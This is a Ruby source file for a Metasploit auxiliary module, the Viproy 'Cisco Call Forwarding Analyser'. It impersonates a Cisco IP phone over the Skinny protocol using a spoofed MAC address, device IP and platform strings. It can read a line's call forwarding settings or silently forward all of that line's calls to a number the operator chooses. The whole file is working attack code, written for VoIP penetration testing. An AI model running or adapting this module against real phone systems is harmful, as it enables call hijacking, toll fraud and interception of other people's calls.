##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Skinny
  include Msf::Exploit::Remote::Tcp

  def initialize
    super(
      'Name'				=> 'Viproy Cisco Call Forwarding Analyser',
      'Description' => 'This module helps to test call forwarding features for Skinny',
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'License'     =>  MSF_LICENSE,
    )
    register_options(
      [
        OptString.new('MAC',   [ true, "MAC Address"]),
        OptString.new('FORWARDTO',   [ false, "Call forwarding to (e.g. 986100)"]),
        OptString.new('ACTION',   [ true, "Action (FORWARD, INFO)", "INFO"]),
        Opt::RPORT(2000)
      ], self.class)
    register_advanced_options(
      [
        OptString.new('LINE',   [ false, "Source line (e.g. 1,2)", "1"]),
        OptString.new('PROTO_TYPE',   [ true, "Device Type (e.g. SIP,SEP)", "SEP"]),
        OptString.new('DEVICE_IP',   [ false, "IP address of the device for spoofing"]),
        OptString.new('CISCOCLIENT',   [ true, "Cisco software type (ipphone,cipc)", "cipc"]),
        OptString.new('CAPABILITIES',   [ false, "Capabilities of the device (e.g. Router, Host, Switch)", "Host"]),
        OptString.new('PLATFORM',   [ false, "Platform of the device", "Cisco IP Phone 7975"]),
        OptString.new('SOFTWARE',   [ false, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
        OptString.new('DEBUG',   [ false, "Debug level" ])
      ], self.class)
  end

  def mac
    format_mac(datastore['MAC']).upcase
  end

  def run
    line = datastore['LINE'] || "1"
    client = datastore['CISCOCLIENT'].downcase
    capabilities = datastore['CAPABILITIES'] || "Host"
    platform = datastore['PLATFORM'] || "Cisco IP Phone 7975"
    software = datastore['SOFTWARE'] || "SCCP75.9-3-1SR2-1S"
    rhost = datastore['RHOST']
    action = datastore['ACTION']
    if datastore['DEVICE_IP']
      device_ip = datastore['DEVICE_IP']
    else
      device_ip = Rex::Socket.source_address(rhost)
    end
    device = "#{datastore['PROTO_TYPE']}#{mac.gsub(":", "")}"

    begin
      connect

      # Register
      register(sock, device, device_ip, client, mac)

      # Sending Register Available Lines Request
      sock.put(prep_registeravailablelines)
      vprint_status("Register Available Lines request sent")

      case action
      when "INFO"
        # Sending Forwarding Information Request
        sock.put(prep_forwardstatreq(line))
        vprint_status("Forwarding Information request sent for the line #{line}")

        # Retrieving the response from the socket
        forwardstatreceived = false
        c = 0
        while c < 3 && !forwardstatreceived
          responses = getresponse

          # Retrieving the forward status response from the socket
          responses.each do|response|
            r, m, l = response
            if r == "ForwardStatMessage"
              forwardstatreceived = true
              print_good("The following is the forwarding information for #{mac} and line #{line}")
              m.split("\t").each do |l|
                print_good("  #{l}")
              end
            end
          end
          c += 1
          if c == 3
            print_error("Forward status couldn't retrieve.")
            return nil
          end
        end

      when "FORWARD"
        # Call Forwarding Target
        forwardto = datastore['FORWARDTO']

        unless forwardto
          print_error("Call forwarding target is not defined.")
          return nil
        end

        # Call Forwarding Request
        sock.put(prep_softkeyevent("callfwdall", 0, 0))
        print_status("Line is open for Call Forward to #{forwardto}")

        # Retrieving the start tone response from the socket
        starttonereceived = false
        c = 0
        while c < 3 && !starttonereceived
          responses = getresponse

          # Retrieving the start tone response from the socket
          responses.each do|response|
            r, m, l = response
            case r
            when "StartToneMessage"
              starttonereceived = true
              @callidentifier = m.split("\t")[0].split(": ")[1]
              vprint_status("Call identifier is #{@callidentifier}")
            when "error"
              print_error("Call forwarding failed.")
              return nil
            end
          end
          c += 1
        end

        # Dialing the number
        forwardto.each_char do |n|
          sock.put(prep_keypadbutton(n, 0, @callidentifier))
        end
        print_status("Numbers dialed for Call Forward to #{forwardto}")

        # Sending Keep Alive Request
        sock.put(prep_keepalive)
        vprint_status("Keep Alive Request sent")

        # Retrieving the response from the socket
        keepalivereceived = false
        c = 0
        while c < 3 && !keepalivereceived
          responses = getresponse

          # Retrieving the start tone response from the socket
          responses.each do|response|
            r, m, l = response
            case r
            when "KeepAliveAckMessage"
              keepalivereceived = true
              vprint_status("Keep Alive Request received, the call forwarding successful. ")

              # End Call Request
              sock.put(prep_softkeyevent("endcall", 1, @callidentifier))
              print_good("The call forwarding is completed. Use INFO to confirm the forwarding.")
            when "error"
              print_error("Call forwarding failed.")
              return nil
            end
          end
          c += 1
          if c == 3
            print_error("Keep alive information couldn't retrieve. Use INFO to confirm the forwarding.")
            return nil
          end
        end

      end

      disconnect

    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.class}: #{e}")
      return nil
    end
  end
end
